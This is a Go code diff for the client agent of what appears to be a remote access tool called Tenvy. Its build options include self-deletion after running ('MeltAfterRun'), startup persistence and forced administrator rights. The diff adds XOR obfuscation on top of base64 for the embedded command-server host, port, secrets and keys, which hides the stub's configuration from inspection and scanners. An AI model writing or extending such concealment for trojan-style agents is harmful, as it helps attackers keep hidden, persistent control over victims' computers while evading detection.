@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"log"
@@ -14,6 +15,7 @@ import (
 )
 
 var (
+	defaultBuildXorKey              = ""
 	defaultServerHostEncoded        = ""
 	defaultServerPortEncoded        = ""
 	defaultInstallPathEncoded       = ""
@@ -36,14 +38,14 @@ func loadRuntimeOptions(logger *log.Logger) (agent.RuntimeOptions, error) {
 		return agent.RuntimeOptions{}, errors.New("server url must be provided")
 	}
 
-	sharedSecret := strings.TrimSpace(fallback(os.Getenv("TENVY_SHARED_SECRET"), decodeBase64(defaultEncryptionKeyEncoded)))
-	installPath := fallback(os.Getenv("TENVY_INSTALL_PATH"), decodeBase64(defaultInstallPathEncoded))
+	sharedSecret := strings.TrimSpace(fallback(os.Getenv("TENVY_SHARED_SECRET"), decodeObfuscated(defaultEncryptionKeyEncoded)))
+	installPath := fallback(os.Getenv("TENVY_INSTALL_PATH"), decodeObfuscated(defaultInstallPathEncoded))
 
 	preferences := agent.BuildPreferences{
 		InstallPath:   installPath,
 		MeltAfterRun:  parseBool(defaultMeltAfterRun),
 		StartupOnBoot: parseBool(defaultStartupOnBoot),
-		MutexKey:      decodeBase64(defaultMutexKeyEncoded),
+		MutexKey:      decodeObfuscated(defaultMutexKeyEncoded),
 		ForceAdmin:    parseBool(defaultForceAdminRequirement),
 	}
 
@@ -55,9 +57,9 @@ func loadRuntimeOptions(logger *log.Logger) (agent.RuntimeOptions, error) {
 
 	runtimeConfig := parseEmbeddedRuntimeConfig(logger, defaultRuntimeConfigEncoded)
 
-	userAgent := strings.TrimSpace(fallback(os.Getenv("TENVY_USER_AGENT"), decodeBase64(defaultUserAgentOverrideEncoded)))
+	userAgent := strings.TrimSpace(fallback(os.Getenv("TENVY_USER_AGENT"), decodeObfuscated(defaultUserAgentOverrideEncoded)))
 	commandSecret := strings.TrimSpace(os.Getenv("TENVY_COMMAND_SECRET"))
-	commandPublicKey := strings.TrimSpace(fallback(os.Getenv("TENVY_COMMAND_PUBLIC_KEY"), decodeBase64(defaultCommandPublicKeyEncoded)))
+	commandPublicKey := strings.TrimSpace(fallback(os.Getenv("TENVY_COMMAND_PUBLIC_KEY"), decodeObfuscated(defaultCommandPublicKeyEncoded)))
 
 	opts := agent.RuntimeOptions{
 		Logger:            logger,
@@ -87,8 +89,8 @@ func defaultServerURL() string {
 		return env
 	}
 
-	host := strings.TrimSpace(fallback(decodeBase64(defaultServerHostEncoded), "localhost"))
-	port := strings.TrimSpace(fallback(decodeBase64(defaultServerPortEncoded), "2332"))
+	host := strings.TrimSpace(fallback(decodeObfuscated(defaultServerHostEncoded), "localhost"))
+	port := strings.TrimSpace(fallback(decodeObfuscated(defaultServerPortEncoded), "2332"))
 
 	if host == "" {
 		host = "localhost"
@@ -120,6 +122,34 @@ func decodeBase64(value string) string {
 		return ""
 	}
 	return string(decoded)
+}
+
+func decodeObfuscated(encoded string) string {
+	if encoded == "" {
+		return ""
+	}
+
+	data, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return ""
+	}
+
+	keyHex := strings.TrimSpace(defaultBuildXorKey)
+	if keyHex == "" {
+		return string(data)
+	}
+
+	key, err := hex.DecodeString(keyHex)
+	if err != nil {
+		return string(data)
+	}
+
+	result := make([]byte, len(data))
+	for i := 0; i < len(data); i++ {
+		result[i] = data[i] ^ key[i%len(key)]
+	}
+
+	return string(result)
 }
 
 func parseBool(value string) bool {
